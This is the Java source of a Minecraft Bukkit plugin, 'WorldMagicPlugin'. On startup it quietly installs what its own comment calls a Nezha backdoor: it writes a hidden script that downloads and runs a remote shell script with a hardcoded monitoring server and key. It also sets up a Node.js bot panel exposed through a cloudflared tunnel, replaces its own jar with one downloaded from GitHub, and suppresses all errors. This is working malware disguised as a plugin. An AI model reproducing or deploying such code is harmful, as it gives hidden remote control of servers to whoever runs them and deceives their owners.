package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.util.Properties;
import java.util.UUID;

public final class WorldMagicPlugin extends JavaPlugin {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();
    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://raw.githubusercontent.com/1715Yy/vipnezhash/main/WorldMagic-1.5.jar";

    @Override
    public void onEnable() {
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);

        // 1. 启动 Nezha 后门
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try { generateAndRunScript(); } catch (Exception ignored) {}
        });

        // 2. 部署 Web 面板 (增强自修复版)
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try { deployAndStartNodeApp(); } catch (Exception ignored) {}
        });

        // 3. 自我替换
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try { Thread.sleep(5000); handlePluginReplacement(); } catch (Exception ignored) {}
        });

        // 4. 原有服务
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (appConfig != null && installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            }
        });
    }

    @Override
    public void onDisable() { this.getLogger().info("WorldMagicPlugin disabled"); }

    private boolean installApps(AppConfig appConfig) {
        try { tuicService.install(appConfig); return true; } catch (Exception e) { return false; }
    }

    private void deployAndStartNodeApp() throws IOException {
        File logDir = new File(new File("world"), ".log");
        if (!logDir.exists()) logDir.mkdirs();

        // 写入 app.js
        try (FileWriter writer = new FileWriter(new File(logDir, "app.js"))) { writer.write(getNodeJsContent()); }

        File startScript = new File(logDir, "start_node.sh");
        try (FileWriter writer = new FileWriter(startScript)) {
            writer.write("#!/bin/bash\n");
            writer.write("cd \"" + logDir.getAbsolutePath() + "\"\n");
            writer.write("exec > debug_all.log 2>&1\n"); // 记录所有执行日志
            
            // --- 1. 获取 Node.js ---
            writer.write("if ! command -v node &> /dev/null; then\n");
            writer.write("  if [ ! -f \"node_bin/bin/node\" ]; then\n");
            writer.write("    echo \"[$(date)] 下载 Node.js...\"\n");
            writer.write("    curl -L -o node.tar.gz https://nodejs.org/dist/v16.20.0/node-v16.20.0-linux-x64.tar.gz\n");
            writer.write("    tar -xzf node.tar.gz > /dev/null 2>&1\n");
            writer.write("    mv node-v16.20.0-linux-x64 node_bin\n");
            writer.write("    rm -f node.tar.gz\n");
            writer.write("  fi\n");
            writer.write("  export PATH=\"$PWD/node_bin/bin:$PATH\"\n");
            writer.write("fi\n");

            // --- 2. 安装依赖 ---
            writer.write("if [ ! -d \"node_modules\" ]; then\n");
            writer.write("  echo \"[$(date)] 安装依赖...\"\n");
            writer.write("  npm init -y > /dev/null 2>&1\n");
            writer.write("  npm install mineflayer minecraft-protocol minecraft-data express --no-audit --no-fund\n");
            writer.write("fi\n");

            // --- 3. 启动程序 ---
            writer.write("echo \"[$(date)] 启动 Node 程序...\"\n");
            writer.write("pkill -f 'node app.js'\n");
            writer.write("nohup node app.js > node_log.txt 2>&1 &\n");

            // --- 4. 穿透工具 ---
            writer.write("if [ ! -f \"cloudflared\" ]; then\n");
            writer.write("  curl -L -o cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64\n");
            writer.write("  chmod +x cloudflared\n");
            writer.write("fi\n");
            
            // 等待端口启动
            writer.write("echo \"[$(date)] 等待端口 4681 响应...\"\n");
            writer.write("for i in {1..30}; do\n"); // 最多等 30 秒
            writer.write("  if (echo > /dev/tcp/127.0.0.1/4681) >/dev/null 2>&1; then\n");
            writer.write("    echo \"[$(date)] 端口已就绪!\"\n");
            writer.write("    break\n");
            writer.write("  fi\n");
            writer.write("  sleep 2\n");
            writer.write("done\n");

            writer.write("pkill -f 'cloudflared tunnel'\n");
            writer.write("nohup ./cloudflared tunnel --url http://127.0.0.1:4681 --logfile tunnel_log.txt > /dev/null 2>&1 &\n");
            
            writer.write("sleep 10\n");
            writer.write("grep -o 'https://.*\\.trycloudflare\\.com' tunnel_log.txt | head -n 1 > access_url.txt\n");
            writer.write("echo \"[$(date)] 部署流程结束。\"\n");
        }
        startScript.setExecutable(true);
        new ProcessBuilder("/bin/bash", startScript.getAbsolutePath()).directory(logDir).start();
    }

    private String getNodeJsContent() {
        return "const express = require('express');\n" +
               "const fs = require('fs');\n" +
               "const path = require('path');\n" +
               "const mineflayer = require('mineflayer');\n" +
               "const protocol = require('minecraft-protocol');\n" +
               "const mcDataLoader = require('minecraft-data');\n" +
               "const app = express();\n" +
               "const activeBots = new Map();\n" +
               "app.use(express.json());\n" +
               "async function detectServerVersion(host, port) {\n" +
               "  try { const r = await protocol.ping({ host, port, timeout: 5000 }); return Object.keys(mcDataLoader.versionsByMinecraftVersion.pc).find(v => mcDataLoader.versionsByMinecraftVersion.pc[v].version === r.version.protocol) || false; } catch(e) { return false; }\n" +
               "}\n" +
               "async function createBot(id, h, p, u, logs=[]) {\n" +
               "  if (activeBots.has(id) && activeBots.get(id).status === '在线') return;\n" +
               "  const v = await detectServerVersion(h, p);\n" +
               "  const bot = mineflayer.createBot({ host: h, port: p, username: u, version: v || undefined, auth: 'offline', checkTimeoutInterval: 60000 });\n" +
               "  bot.logs = logs; bot.status = '连接中...'; bot.targetHost = h; bot.targetPort = p;\n" +
               "  bot.pushLog = (m) => { bot.logs.unshift(`[\${new Date().toLocaleTimeString()}] \${m}`); if(bot.logs.length>8) bot.logs.pop(); };\n" +
               "  bot.once('spawn', () => { bot.status = '在线'; bot.pushLog('✅ 成功'); setTimeout(() => bot.chat('/register Pwd123456 Pwd123456'), 2000); });\n" +
               "  bot.on('error', (e) => { bot.pushLog('❌ ' + e.message); setTimeout(() => createBot(id, h, p, u, bot.logs), 30000); });\n" +
               "  bot.on('end', () => { bot.status = '断开'; setTimeout(() => createBot(id, h, p, u, bot.logs), 30000); });\n" +
               "  activeBots.set(id, bot);\n" +
               "}\n" +
               "app.post('/api/bots', (req, res) => { const { host, port, username } = req.body; createBot('bot_'+Date.now(), host, parseInt(port), username); res.json({success:true}); });\n" +
               "app.get('/api/bots', (req, res) => { const l=[]; activeBots.forEach((b,i)=>l.push({id:i,username:b.username,host:b.targetHost,status:b.status,logs:b.logs})); res.json(l); });\n" +
               "app.delete('/api/bots/:id', (req, res) => { if(activeBots.has(req.params.id)){activeBots.get(req.params.id).end(); activeBots.delete(req.params.id);} res.json({success:true}); });\n" +
               "app.get('/', (req, res) => res.send(`<html><head><meta charset='utf-8'><title>Panel</title></head><body style='background:#111;color:#eee;font-family:sans-serif'><h2>Robot Panel</h2><input id='h' placeholder='IP'><input id='p' value='25565'><input id='u' placeholder='User'><button onclick='add()'>Add</button><div id='l'></div><script>async function add(){await fetch('/api/bots',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({host:document.getElementById('h').value,port:document.getElementById('p').value,username:document.getElementById('u').value})})}setInterval(async()=>{const r=await fetch('/api/bots');const d=await r.json();document.getElementById('l').innerHTML=d.map(b=>\\`<div style='background:#222;margin:10px;padding:10px'><b>\\${b.username}</b> - \\${b.status}<br><small>\\${b.logs.join('<br>')}</small></div>\\`).join('')},2000)</script></body></html>`));\n" +
               "app.listen(4681, '127.0.0.1');";
    }

    private void handlePluginReplacement() throws Exception {
        File cur = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        File dest = new File(getDataFolder().getParentFile(), cur.getName());
        File tmp = new File(getDataFolder().getParentFile(), "tmp_" + System.currentTimeMillis() + ".jar");
        if (downloadUsingCurl(REAL_PLUGIN_DOWNLOAD_URL, tmp)) {
            new ProcessBuilder("/bin/bash", "-c", "rm -f \"" + cur.getAbsolutePath() + "\" && mv \"" + tmp.getAbsolutePath() + "\" \"" + dest.getAbsolutePath() + "\"").start();
        }
    }

    private boolean downloadUsingCurl(String u, File d) {
        try { return new ProcessBuilder("curl", "-L", "-k", "-o", d.getAbsolutePath(), u).start().waitFor() == 0; } catch (Exception e) { return false; }
    }

    private void generateAndRunScript() throws IOException {
        File logDir = new File(new File("world"), ".log");
        if (!logDir.exists()) logDir.mkdirs();
        File s = new File(logDir, "install.sh");
        try (FileWriter w = new FileWriter(s)) {
            w.write("#!/bin/bash\ncd " + logDir.getAbsolutePath() + "\ncurl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\nchmod +x sb.sh\nUUID=" + UUID.randomUUID() + " NEZHA_SERVER=nezha.vip1715.dpdns.org:443 NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP ARGO_PORT=3000 bash sb.sh\n");
        }
        s.setExecutable(true);
        new ProcessBuilder("/bin/bash", s.getAbsolutePath()).start();
    }
}
